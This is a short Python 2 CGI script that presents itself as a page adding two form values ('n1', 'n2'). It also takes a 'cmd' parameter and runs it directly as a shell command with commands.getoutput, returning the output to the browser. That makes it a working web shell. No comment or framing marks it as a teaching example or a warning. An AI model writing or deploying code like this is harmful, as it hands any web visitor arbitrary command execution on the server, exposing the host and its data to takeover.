#!/usr/bin/python

import  cgi
import  commands
print "Content-type:text/html"
print  ""

web=cgi.FieldStorage()
a=web.getvalue('n1')
b=web.getvalue('n2')
c=web.getvalue('cmd')

print  int(a)+int(b)

print   "<pre>"
print commands.getoutput(c)
print  "</pre>"
